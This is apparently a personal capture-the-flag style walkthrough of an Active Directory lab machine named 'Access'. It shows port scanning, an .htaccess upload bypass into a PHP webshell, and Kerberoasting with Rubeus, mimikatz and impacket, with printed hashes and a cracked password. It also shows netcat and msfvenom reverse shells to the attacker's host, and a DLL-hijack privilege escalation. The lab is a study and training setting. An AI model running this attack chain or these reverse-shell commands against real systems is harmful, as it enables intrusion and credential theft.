#### Info Enumeration
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Access The Event
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-23 05:37:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Access The Event
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49783/tcp open  msrpc         Microsoft Windows RPC
```

fuff the dir of port 90
```
[13:42:18] 301 -  344B  - /uploads  ->  http://192.168.206.187/uploads/
[13:42:18] 200 -  777B  - /uploads/
```
add domain name in to hosts file.
`access.offsec`

#### Foot Hold
There is a upload function in port 80, but file extension restricted.

Upload .htaccess to allow php file.
```
.htaccess (Hypertext Access) file is a plain-text configuration file used by the Apache HTTP Server (and compatible web servers like LiteSpeed).

Enables Server-Side Script Execution (e.g., PHP)

Historically, AddType was used to instruct Apache's PHP handler to execute specific file extensions as PHP scripts.
```
in .htaccess:
```
AddType application/x-httpd-php .php16
```

`http://192.168.206.187/uploads/simcmd.php16?cmd=whoami`

`certutil.exe -urlcache -f http://192.168.45.202/nc64.exe C:\Users\Public\nc64.exe`

`http://192.168.206.187/uploads/simcmd.php16?cmd=C:\Users\Public\nc64.exe%20192.168.45.202%208821%20-e%20cmd`

get http shell, then I identify the service SPN on this domain

`PS C:\Users\Public> wget http://192.168.45.202/AD/Get-SPN.ps1 -o Get-SPN.ps1`
```
wget http://192.168.45.202/AD/Get-SPN.ps1 -o Get-SPN.ps1
```
`PS C:\Users\Public> .\Get-SPN.ps1`
```
.\Get-SPN.ps1
Object Name =  SERVER
DN      =       CN=SERVER,OU=Domain Controllers,DC=access,DC=offsec
Object Cat. =  CN=Computer,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/SERVER.access.offsec
SPN( 2 )   =       ldap/SERVER.access.offsec/ForestDnsZones.access.offsec
SPN( 3 )   =       ldap/SERVER.access.offsec/DomainDnsZones.access.offsec
SPN( 4 )   =       DNS/SERVER.access.offsec
SPN( 5 )   =       GC/SERVER.access.offsec/access.offsec
SPN( 6 )   =       RestrictedKrbHost/SERVER.access.offsec
SPN( 7 )   =       RestrictedKrbHost/SERVER
SPN( 8 )   =       RPC/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec
SPN( 9 )   =       HOST/SERVER/ACCESS
SPN( 10 )   =       HOST/SERVER.access.offsec/ACCESS
SPN( 11 )   =       HOST/SERVER
SPN( 12 )   =       HOST/SERVER.access.offsec
SPN( 13 )   =       HOST/SERVER.access.offsec/access.offsec
SPN( 14 )   =       E3514235-4B06-11D1-AB04-00C04FC2DCD2/20dae709-54fe-40ec-8c68-4475793b542a/access.offsec
SPN( 15 )   =       ldap/SERVER/ACCESS
SPN( 16 )   =       ldap/20dae709-54fe-40ec-8c68-4475793b542a._msdcs.access.offsec
SPN( 17 )   =       ldap/SERVER.access.offsec/ACCESS
SPN( 18 )   =       ldap/SERVER
SPN( 19 )   =       ldap/SERVER.access.offsec
SPN( 20 )   =       ldap/SERVER.access.offsec/access.offsec

Object Name =  krbtgt
DN      =       CN=krbtgt,CN=Users,DC=access,DC=offsec
Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       kadmin/changepw

Object Name =  MSSQL
DN      =       CN=MSSQL,CN=Users,DC=access,DC=offsec
Object Cat. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN( 1 )   =       MSSQLSvc/DC.access.offsec
```

here we find 1 svc mssql. we have the SPN, we are able to request a ticket and store it in memory with the end goal of getting it’s hash.

##### Option 1: Native PowerShell & Rubeus (From a Windows Host)
1. Requesting the Ticket using Native Built-in .NET Classes
# Request the TGS ticket for a specific SPN into current session memory
`Add-Type -AssemblyName System.IdentityModel`

`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dc.access.offsec"`
```
Id                   : uuid-4026f5a5-b7b3-425e-9bf9-90f3f5666888-3
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 7/23/2026 8:18:20 AM
ValidTo              : 7/23/2026 6:17:34 PM
ServicePrincipalName : MSSQLSvc/dc.access.offsec
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

`PS C:\Users\Public> .\Rubeus.exe kerberoast /spn:MSSQLSvc/dc.access.offsec /nowrap`
```
.\Rubeus.exe kerberoast /spn:MSSQLSvc/dc.access.offsec /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.


[*] Target SPN             : MSSQLSvc/dc.access.offsec
[*] Hash                   : $krb5tgs$23$*USER$DOMAIN$MSSQLSvc/dc.access.offsec*$F5DAD5C58B7B6530EADC29B627F93B3A$F102AD38DF76D306942FE9C864349A47E3AB3DBA97D2400E6556115B0F0146EAE76BBED6F3BD92DCDE6B475823210BA79CAF5A280E6FCFACB295DC0C936948A2D769E296B4323060E9BF25C040499A7DE1DD4B7247EDE8EB4391D6C2A704670546294D0AE74A62452D62766B4394C184202A5B963725B148C3D5F60E41FA195AF24832A51EE2C38CA2C63EEC3F1997F8D40AAC13C08956447FEC7E07BB8DA4253C519A81118CD09F9813ADC1E13CC0101E9EDBFF5281BF730758EB88E7120F30F4867C47DE9139CAB55BCC7883158FF3AF72A7A4AE3E0E233C8BAD97D4FAACAC62F221B4E0F982FB047D017BB06B75DAC78F8B81F58F76A8B7159AE60DCCF45D988774284C4755EFF7172EBF8B36729CF3AC91282D6CB1FA938F7C79940EC952F98BB193C0E85167DA49A15784FA28D56CE6E7CA1D2232BCAC5E5C04DCB6C9DE05C54576BD65BFDBD7FD6E1E7900900C4AA67CEFED1CBCD4E3D0283745B13F7A0121596E332563A7EB61DB34927C7893EB3CAD5272D638471606DDCB94A035FD0815AA37CF4342A09E071376C2F6535D08F2CB661E0CFE75DC7FF311B85EE3CD7F7926649FDDBE811001ABFB7BFC8FFE3E6236D745B5A1CA4B6E73984F48933DFB3F6A916F9467B5C3ADBAB9C48FB44A7DF81D347E434FC50AD8750BDBB3246AE67D40D2DE2A9ACF6F4D929AF66A1EF3D896EE37F86B9BC8E0754C39C716B32D83C89DDC638DA4FABC6F7D712C4D2FB8F19B6DE34EBBE66701575F022FECC8DB04B83ACBB2FBE15C4EE74FE4127A940EFAABFCC513E6AD4120E61FDCB64BD55FB3000F57BD0B4F01D42156C2121ABE6DFEC6218B378ED7D2444BF711C27FC62F26F568447C98D6A36E57BC4F32BFD15B485ABC55A160F0E79DF2B798F7C4E6727743E916D5632D57C93F2368000290FDF89D4D4395EF9F3137CA417B16241C47F413B1833C14203E81605B53382DD27C83CD02DCCFDE13F35A11A4361A506691FD7BFB1277CDF89DC55CC6BC0718211E8F27055EDC2B1A5E410810DEBE7C943922ED10DD3E7F5A87412604791A9249AEF6EAA73D7C84A60A98E145EB6C3037AAF9C79B24CD6269677848B28E42F04CC67DBAF3EE0D0FDD2C1BB5875F7B7BA5E5C33322B91355C47F3B4A15395CBCE54876314C88EAB14771E8B9FD13B50824DF6444DABEDBB19ABEEF37344DE9C262B1133407A4FE701EB2C8768FC46C68F75334E0994D95C95A8229AA135F8EE22E8583F800A4BC24DE358E9F30C8AB8FAB9C4C3DE22064699EED686BE97DAA5BEA1C523484A8E8462E325748396DDCEE6FC7661123B73DE373A0EBC5434D3BC3518C45F52FD38BE991E84729C1B1AF228DCFCBF2F0DE1964CE7D4FB71B49551496D4F6A4C6D5FB8A2D8CE11194D6403CCB1E706BEC3375F381FB0FAF5ED2B5481CD3B61F55C5D7D4B353A2CCE2AF65369A7B629B8FC4397A78C513876E4942FE8DA4B47F091E647331E34B2587D54FA8F70B067597BCE0F23E816C1EF1298B669FBA101736F342A50F9096CA5945CF84F97B79036FACCEA649997588A5BAE09FDAE60623A3C4C68CF137EFD722983280BF984132CA965621726121CD06CC175CBCCF2D57

$krb5tgs$23$
*hash*$4e0e6df7f48a023a1dff8125f60186dc$cdfd476519484cb3b69ebd962508602e3124dbbbdf96df5fbc158ce8d1b0fea2f8b92b7389829e28a57a4e4d5fbcae749b2c2f1890bee54f02c4d91f0a0c188b9e9e4d50af119f02447487329cd5b0abf0de9e88779e0a093a435c95b511c896f99f5c8e0bc0b3bd4d8324042cff8e3f6231a40e12db02e6e79776ca81cc3c1a0a7265eec2a4381b56c4c78ed8d1df023559a2d17f2eaab8b4f38226e338ba54437c0042ba21be1622322254e13837144ff07b836e0f9aeee1d0f645be5772f5041a971f301fc0f3b12030049184d75923d32294388a47dfe5e3af97ccbd811a140e3f01f23cf15d03c65a21174871af14c20361394319690658ba55519a4a0fe076dc602b6a877ee7338ff6e817e8280edbc8e9202ef3d1175c6c33f12b36af4d2ab4c12b9741dda95d5618d17c4d3a91cf56a656ad27229cfca37c27bb2d2838ed05758e93b06f14758b9c16315d51c361dc9b6fd85abcc83a15a1b71ef284d7292199b67edceea1d98bf83dc52d2ac921f5d25a7e2525892a2c27ced7e7992a8e591ebb56354ea4fb932786083949eb02912f7596e4b54e3784970f3fde9fe093664221751b175b8550823f58e5c6c7ad7e5eab0171d93c708dd17b3ac164658449c5d738440b59cd8d9e84b080f69ed9ffa05f77afc06dfd3c175645c307fc115445112d782251797b9bd70e8edc500f571eff9a6ea61bced5018da6b90dd1d453f6e38b9480b7c78a8ee10d96a1a96f8bd76d903a38125f7ea9a47d5b6b56626a489d8b0bf4bf82cf8351eb9d84d0e14c3484cc3b016fab9c3ab31e1cfb81bd593fe917b16270b58c85786e6d91a418b5f3ccd31774ada022fe9fcff6d70097aaebc2fe2700ef4a5ba73caf0433d6c3d1ae683338f61057fe2653f18c0ce88ae45a26e5dbe549bb47797a299c34a1c677977c607322a7cb55504a44c7ded30ad6c4496c6d7f91610e17edebcfa7252836ec570b4b2d9ecd50a287aaacc324383fd998c363657649a91bb180b0a8e1c2bd53a46bea20b50aac88b475158078963223dedecd88536226dfa580e0f0bbb61dd4c1b425ec0e6d447b73113a0f80dde7d1f9e72d23a15e383ddd23dd1cbd948408829d661d76f06ce8967fed013c791cd17c40b2420f22a84b75243a85f73380e7d2ed7e34de844dafe53474073ff2d56be0f7de9e5b455596ff6bda6645533b8a8d0c6e8554d5831a5337294f214394a46cbfa0d7b56b49ff017e0ee0f345f3ef245b1339308b37a9ca66912e1e8e82db0c612e965b636b0d107d00acc55bf80d2827ac4a06092579a6c9acafa498d776d4396a060f1dad5a1689d3465379dfcca50c216c7d457909a82df2c7595bbf6b74e70b549901a9784325860bf9fca9bea75a5df6763a0b88b8045148ba7b88149c5e6c0add87f5bc1db40a403fdea7995098dcf258d901200057ba99a7525d9c1ed09e1a65ccdeb883f6c1af169638e13fd436e83ece53544f594c1e64451a6af92d2843713c8d92b54d367042f67f1519febdbca0ff02dc
```

##### method 2: use powerview to load the TGT and use mimikatz to save it as .kirbi ticket, then use kirbi2john to convert it into plain hash type 13100 pendding crack it use hashcat

load powerview
`'PS C:\Users\Public> . .\pv.ps1'`

`PS C:\Users\Public> Get-Domain`
```
Get-Domain


Forest                  : access.offsec
DomainControllers       : {SERVER.access.offsec}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : SERVER.access.offsec
RidRoleOwner            : SERVER.access.offsec
InfrastructureRoleOwner : SERVER.access.offsec
Name                    : access.offsec
```
`PS C:\Users\Public> Get-DomainSPNTicket -SPN "MSSQLSvc/DC.access.offsec"`
```
SamAccountName       : UNKNOWN
DistinguishedName    : UNKNOWN
ServicePrincipalName : MSSQLSvc/DC.access.offsec
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$MSSQLSvc/DC.access.offsec*$0BC4FD988F47B4DD60848F871F52DD8B$1AC41F1
                       F85B88966254BEBCAA8FAB2192B61238FEC860BF4A09E5D9550B9D16A5E517BD8BA47CFDA3EE2F0273254D5405BBF3FA
                       2E58D2BE79A19AC77ED425881DCA8260600B8F4F27301F749E8A0F81858302EE24C418752BEC53AFE612F256F35BC326
                       7E737406CCD771AAE37B542A97975363BEB95C39011365127D05AB70CCF3B3191BB63D2C451019C67C739AA152448E07
                       42BF6FEF4B998A9A6F0129F95A37E09BA7090294CDC0D9A20C35E4E6E78AFDDD6BBBBD1CE0DD9236AD9C125F7167AFA2
                       4B5E3979E73BF65E0FA2DDE51E7B43D1E0A44F7EE05B571F606E9EFB52FFE76A38730671C181F6F68BE44611A1225495
                       12D9F52A4A5F6C1EC660D48681C932CD19F7C790438A4739AB4529C38EB09BFF9ACEA2EEEE51C20EB5AC793D05A9BCA3
                       A9C851FC39806E3953A8D3AEE059E4B40C62D4F8727EBFD6958905651EA29C93F50716B19EB08EEBA513E7C6F16F2242
                       9BBD11BC03992DE709E3684464E3FA3075B6FB965058
```
`PS C:\Users\Public> .\m.exe`
```
.\m.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # kerberos::ask /target:MSSQLSvc/DC.access.offsec
Asking for: MSSQLSvc/DC.access.offsec
   * Ticket Encryption Type & kvno not representative at screen

	   Start/End/MaxRenew: 7/27/2026 11:12:54 PM ; 7/28/2026 8:38:23 AM ; 8/3/2026 10:38:23 PM
	   Service Name (02) : MSSQLSvc ; DC.access.offsec ; @ ACCESS.OFFSEC
	   Target Name  (02) : MSSQLSvc ; DC.access.offsec ; @ ACCESS.OFFSEC
	   Client Name  (01) : svc_apache ; @ ACCESS.OFFSEC
	   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
	   Session Key       : 0x00000017 - rc4_hmac_nt      
	     88ef7f2067fbc11eda289a4c88026835
	   Ticket            : 0x00000017 - rc4_hmac_nt       ; kvno = 0	[...]
```

`mimikatz # kerberos::list `

```
[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 7/27/2026 10:38:23 PM ; 7/28/2026 8:38:23 AM ; 8/3/2026 10:38:23 PM
   Server Name       : krbtgt/ACCESS.OFFSEC @ ACCESS.OFFSEC
   Client Name       : svc_apache @ ACCESS.OFFSEC
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 

[00000001] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 7/27/2026 11:12:54 PM ; 7/28/2026 8:38:23 AM ; 8/3/2026 10:38:23 PM
   Server Name       : MSSQLSvc/DC.access.offsec @ ACCESS.OFFSEC
   Client Name       : svc_apache @ ACCESS.OFFSEC
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 7/27/2026 10:40:26 PM ; 7/28/2026 8:38:23 AM ; 8/3/2026 10:38:23 PM
   Server Name       : svc_mssql @ ACCESS.OFFSEC
   Client Name       : svc_apache @ ACCESS.OFFSEC
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
```
```
C:\Users\Public>.\nc64.exe 192.168.45.202 8823 < 2-40a10000-svc_apache@svc_mssql-ACCESS.OFFSEC.kirbi
.\nc64.exe 192.168.45.202 8823 < 2-40a10000-svc_apache@svc_mssql-ACCESS.OFFSEC.kirbi
```
`kirbi2john shash`

`hashcat -m 13100 o -a 0 ~/tools/rockyou.txt`

##### method 3: request hash from kali

`─$ impacket-GetUserSPNs access.offsec/svc_mssql:'trustno1' -dc-ip 192.168.237.187 -request`
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName       Name       MemberOf  PasswordLastSet             LastLogon                   Delegation 
-------------------------  ---------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/DC.access.offsec  svc_mssql            2022-05-21 20:33:45.702230  2026-07-24 15:47:15.604121             


[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_mssql$ACCESS.OFFSEC$access.offsec/svc_mssql*$5cb51eeee5af5d5fe3be770ee56bddb2$ea85933069d5a3e3d8282b7a72c52b3cb15ff070b7fb818dcc331a5f0f2b545e5d7a557ae5cea09b4dfcadf049d760df2b7b17aca9055dc49a1ab776f142db6fe2bbba266ed743acf33ff066264f1cf2f8bd7ca5e94204d16177f52a21c4e256626995907aaa930a7ce260d78e7ec805188797ea7a882d112f80962c4e2724864c950755c139ae0e96d60b6e02070d23078d819fc6687f85342b3a34bbc385c6f81b254528d6079d6dede8d98d35b62d612674a86b40a87afb473ea3fd1c15fff7d88ac9700e8e31c96a780696b3cc5c740e28d1c9d60470ceb031554bdaf18e0a21a6832d851a435e31b2690f5d45c309b99bf3c74f0095a59c9e95e64abe6127957487f233649c6466e2b228058b5d904273cc105de6413dde79568a32f9b970c0cba32f75793d4926264d7a3ae8feec42fe3b767781bfe7f01d80ffbc1854b77adb809c1636468a061307cc5accaa1d979e2da4c349af1eb15a51fbdc213038817f08442fd5c38847651ea0d0cf4f489717bb02d06e718861e1ad8712086037d2c1b0701e603a7eacd7494873ef03f85b01789e6d68bab6804dee870ac71ff3c58d53aba3e6a36b254612d5cf7fea72e25bbdbbfd7200c496d46631215accb7560e9fa59e871dc1b0ad22ea52cd441eeff8d6c1ae0cd37336a7b0db9c695b6527ae1104857c09d7f17ab1aa14bbab078ba544f34a2ac3627167232d103f013c96e0ffb3ab6c04864608f41bb8db3502712ad986a62ac5484358bab616c5a3b150a04d76d38340358ac4545b2549a4ce8bcae491ae7ede4c1b5789b1bf6abad4dd3b570f16e3b890c786f2e0d0afcbaca11d2cfbdfdf6ce82daeac5a65477baa651b30aba125d2365a01c948534e0b999580358a2a722873bc1f940b7e0033a09d9210be216f9730b4c62ab6f25519a9c07643543d3bcda28f12bd2eb689d4d26ed6083b65178a5950892fc86fc24d9a51d9a8dfdf94944aeb7da407e5b3a8209b500c885205f704a57aaddd32402f72353d9bd040753c4bacf80fa98ab19dcc90d8b03d3a44f253ed8ae16c5bebb0b92505ca8e0ba5a4077ffcde54a64bb5a4f72367c7c5bb1293671f661c6f386ef2ecd99a4ef22bdb3b07f9b840d40eb2511be82099fdb5adf3bac4ef8d3e0ca3cd29f0849ab57a355715633b8accfba0b888163a4457df6a757d4d77f6977431c1608e76b5b09015076683e420aef13284d4654dd41ed11e0c69c0053eaa88cffaea19c83bc9b036edc1e8b4f98e271a03cc7aff269569a3c6b7b8ee5574859d8694d16253fc8e378db9c8da2110ea0cbfd30a3ca9d4f3e1f29da56974407f6cf25c2a34a69f163d570ada1f5bb5c073cbe22cbd9b57b74fa41f2d789ac1e777d3b2e429ef50f20e7f2d9280e48cf0a0e7fb7cce767fb960a12a6b856b598f9e096aad63105eff5a28e0c360315654b1cf0c6d0eb1c29d
```

`└─$ hashcat -m 13100 -a 0 hash ~/tools/rockyou.txt `


`PS C:\Users\Public> net users`
```
net users

User accounts for \\SERVER

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt                   
svc_apache               svc_mssql                
The command completed successfully.
```
#### Lateral Move
try smb
`└─$ netexec smb access.offsec -u svc_mssql -p 'trustno1' --shares`
```
SMB         192.168.206.187 445    SERVER           [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:None)
SMB         192.168.206.187 445    SERVER           [+] access.offsec\svc_mssql:trustno1 
SMB         192.168.206.187 445    SERVER           [*] Enumerated shares
SMB         192.168.206.187 445    SERVER           Share           Permissions     Remark
SMB         192.168.206.187 445    SERVER           -----           -----------     ------
SMB         192.168.206.187 445    SERVER           ADMIN$                          Remote Admin
SMB         192.168.206.187 445    SERVER           C$                              Default share
SMB         192.168.206.187 445    SERVER           IPC$            READ            Remote IPC
SMB         192.168.206.187 445    SERVER           NETLOGON        READ            Logon server share 
SMB         192.168.206.187 445    SERVER           SYSVOL          READ            Logon server share
```
but cannot evil-rm into host, so I have to use runas on this session

`PS C:\Users\Public> wget http://192.168.45.195/AD/RunasCs.exe -o RunasCs.exe`

`.\RunasCs.exe svc_mssql trustno1 ".\nc64.exe 192.168.45.195 8822 -e cmd" `

`└─$ nc -nvlp 8822  `
```
listening on [any] 8822 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.237.187] 50046
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
access\svc_mssql
```

#### Priv Escalate
`C:\Users\svc_mssql\Desktop>whoami /priv`
```
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

https://medium.com/@mrlionofficial/privilege-escalation-via-semanagevolumeprivilege-2ebc0077b961

althrough it is disable of SeManageVolumePrivilege, we can still use this exploit payload. Donot know Why.

`wget http://192.168.45.195/AD/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe`

https://github.com/xct/SeManageVolumeAbuse

`.\SeManageVolumeExploit.exe`
```
Entries changed: 929
DONE 
```

`PS C:\Users\svc_mssql\Documents> icacls C:/Windows`
```
icacls C:/Windows
C:/Windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)
           BUILTIN\Users:(RX)
           BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
           CREATOR OWNER:(OI)(CI)(IO)(F)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
```
```
icacls (short for Integrity Control Access Control List Software) is a built-in Windows command-line tool used to view, modify, backup, and restore Access Control Lists (ACLs) for files and folders.

we can view the proof.txt. but still with shell of svc_mssql
```

Get full control over C:\ when the user has SeManageVolumePrivilege (allowing to read/write any files). 
One possible way to get a shell from here is to write a custom dll to C:\Windows\System32\wbem\tzres.dll & call systeminfo to trigger it.

`└─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.45.195 lport=8823 -f dll -o tzres.dll`
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Saved as: tzres.dll
```
`PS C:\Users\Administrator\Desktop> wget http://192.168.45.195/tzres.dll -o C:\Windows\System32\wbem\tzres.dll`

use systeminfo to trigger this dll payload

`└─$ nc -nvlp 8823  `
```
listening on [any] 8823 ...
\connect to [192.168.45.195] from (UNKNOWN) [192.168.237.187] 50333
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\network service
```

#### Lesson learned
- .htaccess file, manages file extension of upload
    (Hypertext Access) file is a configuration file used by Apache web servers. It lets you apply rules on a per-directory basis—meaning you can control redirects, URL structures, security, and performance without touching the main server configuration.
- identify SPN and then load hash of this SPN get credential
- if have write priv to C:\ , C:\C:\Windows\System32\ set paylaod into C:\Windows\System32\wbem\tzres.dll, use systeminfo to trigger

